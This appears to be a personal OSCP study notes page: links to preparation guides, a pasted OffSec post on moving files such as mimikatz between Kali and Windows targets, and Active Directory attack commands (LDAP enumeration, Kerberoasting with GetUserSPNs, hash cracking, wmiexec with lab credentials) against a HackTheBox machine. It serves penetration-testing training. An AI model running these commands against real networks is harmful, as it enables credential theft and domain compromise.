# OSCP

![Untitled](OSCP%20b2cbbe376ade4a73aba8a459a0251a9b/Untitled.png)

[Commands](OSCP%20b2cbbe376ade4a73aba8a459a0251a9b/Commands%20d48daf7ed2cd4fa0a58004e82b4b0b02.md)

[Labs](OSCP%20b2cbbe376ade4a73aba8a459a0251a9b/Labs%20a95100eb1086474abff2761a534c89aa.csv)

[OWASP top 10 - offsec portal](OSCP%20b2cbbe376ade4a73aba8a459a0251a9b/OWASP%20top%2010%20-%20offsec%20portal%20cdfcbbbfb00d42398a925ed6e7ac3d8b.md)

[OSCP Videos Challenge Labs](OSCP%20b2cbbe376ade4a73aba8a459a0251a9b/OSCP%20Videos%20Challenge%20Labs%203306187b1f27408096b6bf169fdf3f00.md)

[Challenge Labs](OSCP%20b2cbbe376ade4a73aba8a459a0251a9b/Challenge%20Labs%20c8b27ab407fd4b57aac5be6620ff1239.md)

[Windows Privilege Escalation](OSCP%20b2cbbe376ade4a73aba8a459a0251a9b/Windows%20Privilege%20Escalation%207b64f1647548473fa660d705e0cc921a.md)

# Kali Error

```markdown
1.ctrl+Alt+F1
2.>sudo nano /etc/X11/Xwrapper.config
#allowed_users=anybody
3.>sudo systemctl restart lightdm
>sudo systemctl restart gdm3
4.>sudo reboot

```

Transfer Files

[https://portal.offsec.com/learning-paths/network-penetration-testing-essentials-pen-100-49568/learning/file-transfers-46870](https://portal.offsec.com/learning-paths/network-penetration-testing-essentials-pen-100-49568/learning/file-transfers-46870)

[https://discord.com/channels/780824470113615893/1148907181480104028](https://discord.com/channels/780824470113615893/1148907181480104028)

oscp 90 days preparation guide 2023

- [http://niiconsulting.com/checkmate/2017/06/a-detail-guide-on-oscp-preparation-from-newbie-to-oscp/](http://niiconsulting.com/checkmate/2017/06/a-detail-guide-on-oscp-preparation-from-newbie-to-oscp/)
    
    [https://johnjhacking.com/blog/the-oscp-preperation-guide-2020/](https://johnjhacking.com/blog/the-oscp-preperation-guide-2020/)
    

AD-

[https://nagendrangs.medium.com/how-i-passed-oscp-with-110-points-in-7-hours-first-attempt-without-metasploit-d6d7f6156444](https://nagendrangs.medium.com/how-i-passed-oscp-with-110-points-in-7-hours-first-attempt-without-metasploit-d6d7f6156444)

[OSCP Reborn - 2023 Exam Preparation Guide](https://johnjhacking.com/blog/oscp-reborn-2023/)

[https://github.com/rkhal101/Hack-the-Box-OSCP-Preparation/blob/master/my-oscp-journey-a-review.md](https://github.com/rkhal101/Hack-the-Box-OSCP-Preparation/blob/master/my-oscp-journey-a-review.md)

[https://gitlab.com/lagarian.smith/oscp-cheat-sheet/-/blob/master/OSCP-exam-report-template_whoisflynn_v3.2.md](https://gitlab.com/lagarian.smith/oscp-cheat-sheet/-/blob/master/OSCP-exam-report-template_whoisflynn_v3.2.md)

https://zer1t0.gitlab.io/posts/attacking_ad/

[https://www.reddit.com/r/oscp/comments/a9e2yv/from_0_to_oscp_in_90days/](https://www.reddit.com/r/oscp/comments/a9e2yv/from_0_to_oscp_in_90days/)

[https://infosecwriteups.com/how-i-passed-oscp-with-100-points-in-12-hours-without-metasploit-in-my-first-attempt-dc8d03366f33](https://infosecwriteups.com/how-i-passed-oscp-with-100-points-in-12-hours-without-metasploit-in-my-first-attempt-dc8d03366f33)

[https://scholarworks.calstate.edu/downloads/pv63g6381](https://scholarworks.calstate.edu/downloads/pv63g6381)

[https://medium.com/@shubhamkhichi5/how-to-practice-and-pass-oscp-from-scratch-a06ef4b5d28a](https://medium.com/@shubhamkhichi5/how-to-practice-and-pass-oscp-from-scratch-a06ef4b5d28a)

[https://www.linkedin.com/pulse/my-journey-from-zero-oscp-2023-krecendo-hui/](https://www.linkedin.com/pulse/my-journey-from-zero-oscp-2023-krecendo-hui/)

[https://www.linkedin.com/posts/arvind-patel-8039ba164_oscp-ethicalhacking-activity-7208264324761427968-jqJQ?utm_source=share&utm_medium=member_desktop](https://www.linkedin.com/posts/arvind-patel-8039ba164_oscp-ethicalhacking-activity-7208264324761427968-jqJQ?utm_source=share&utm_medium=member_desktop)

My journey, from zero to OSCP (2023)
[https://www.linkedin.com/pulse/my-journey-from-zero-oscp-2023-krecendo-hui?utm_source=share&utm_medium=member_android&utm_campaign=share_via](https://www.linkedin.com/pulse/my-journey-from-zero-oscp-2023-krecendo-hui?utm_source=share&utm_medium=member_android&utm_campaign=share_via)

[Goverdhan Kumar on LinkedIn: Roadmap to OSCP 2023](https://www.linkedin.com/posts/goverdhankumar_roadmap-to-oscp-2023-activity-7107230784960249858-qe2s?utm_source=share&utm_medium=member_android)

![](https://miro.medium.com/v2/resize:fit:4800/format:webp/1*lBxx4Qa8SvUU5ZNcfqEtIg.png)

FIle Transfer

```bash
https://portal.offsec.com/learning-paths/network-penetration-testing-essentials-pen-100/books-and-videos/modal/modules/file-transfers
Dear learners,
Since this topic was the most frequently asked questions, we decided to share some tips and tricks about it:
1) SMB: 
On Kali:
```bash
impacket-smbserver test . -smb2support  -username kourosh -password kourosh
```
On Windows:
```powershell
net use m: \\Kali_IP\test /user:kourosh kourosh
copy mimikatz.log m:\
```
2) RDP mounting shared folder:
- Using xfreerdp:
On Kali:
```bash
xfreerdp /cert-ignore /compression /auto-reconnect /u:
offsec /p:lab /v:192.168.212.250 /w:1600 /h:800 /drive:test,/home/kali/Documents/pen-
200
```
On windows:
```powershell
copy mimikatz.log \\tsclient\test\mimikatz.log
```
- Using rdesktop:
On Kali: 
```bash
rdesktop -z -P -x m -u offsec -p lab 192.168.212.250 -r disk:test=/home/kali/Documents/pen-200
```
On Windows:
```powershell
copy mimikatz.log \\tsclient\test\mimikatz.log
```
3) Impacket tools:
psexec and wmiexec are shipped with built in feature for file transfer.
**Note**: By default whether you upload (lput) or download (lget) a file, it'll be writte in `C:\Windows` path.
Uploading mimikatz.exe to the target machine:
```bash
C:\Windows\system32> lput mimikatz.exe
[*] Uploading mimikatz.exe to ADMIN$\/
C:\Windows\system32> cd C:\windows
C:\Windows> dir /b mimikatz.exe
mimikatz.exe
```
Downloading mimikatz.log:
```bash
C:\Windows> lget mimikatz.log
[*] Downloading ADMIN$\mimikatz.log
```
4) Evil-winrm:
- Uploading files:
```bash
upload mimikatz.exe C:\windows\tasks\mimikatz.exe
```
- Downloading files:
```bash
download mimikatz.log /home/kali/Documents/pen-200
```
5) C2 frameworks:
Almost any of the C2 frameworks such as Metasploit are shipped with downloading and uploading functionality.

6) In FTP, binaries in ASCII mode will make the file not executable. Set the mode to binary.

Additional Resources:
File Transfer:  https://www.youtube.com/watch?v=kd0sZWI6Blc
PEN-100: https://portal.offsec.com/learning-paths/network-penetration-testing-essentials-pen-100/books-and-videos/modal/modules/file-transfers

Happy hacking!
```

### Active Directory

[Active directory pentesting: Cheatsheet and beginner guide](https://www.hackthebox.com/blog/active-directory-penetration-testing-cheatsheet-and-guide)

*FOREST, SAUNA, MONTEVERDE, MULTIMASTER, CASCADE, SIZZLE*

```bash
smbmap -H 10.10.10.100 -u svc_tgs -p GPPstillStandingStrong2k18 -r Users/active.htb
smbclient -U SVC_TGS%GPPstillStandingStrong2k18 //10.10.10.100/Users

https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2023_02.svg
https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_2022_04.svg
Active AD machine
ldapsearch -x -H 'ldap://10.10.10.100' -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' -b "dc=active,dc=htb" -s sub "(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2)))" samaccountname | grep sAMAccountName
GetADUsers.py -all active.htb/svc_tgs -dc-ip 10.10.10.100
ldapsearch -x -H 'ldap://10.10.10.100' -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' -b "dc=active,dc=htb" -s sub "(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2))(serviceprincipalname=*/*))" serviceprincipalname | grep -B 1 servicePrincipalName
python3 GetUserSPNs.py active.htb/svc_tgs -dc-ip 10.10.10.100
python3 GetUserSPNs.py active.htb/svc_tgs -dc-ip 10.10.10.100 -request
john --wordlist=rockyou.txt hash
python3 wmiexec.py active.htb/administrator:Ticketmaster1968@10.10.10.100

#DIrectory
>wfuzz -c -z file,/usr/share/SecLists/Discovery/Web-Content/raft-large-files.txt --hc 404 http://192.168.203.187:80/FUZZ/
```
